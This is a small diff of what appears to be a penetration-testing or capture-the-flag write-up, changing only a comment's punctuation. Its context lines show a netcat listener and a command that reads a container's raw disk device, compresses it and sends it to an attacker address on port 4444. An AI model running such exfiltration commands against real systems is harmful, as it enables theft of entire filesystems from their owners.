@@ -23,7 +23,7 @@ nc -lvnp 4444 > dm-0.gz
 ```
 
 ```bash
-# Exfil filesystem (target container rootfs, e.g., dm-0)
+# Exfil filesystem (target container rootfs, e.g. dm-0)
 dd if=/dev/dm-0 | gzip -1 - | nc 10.10.14.10 4444
 ```
 
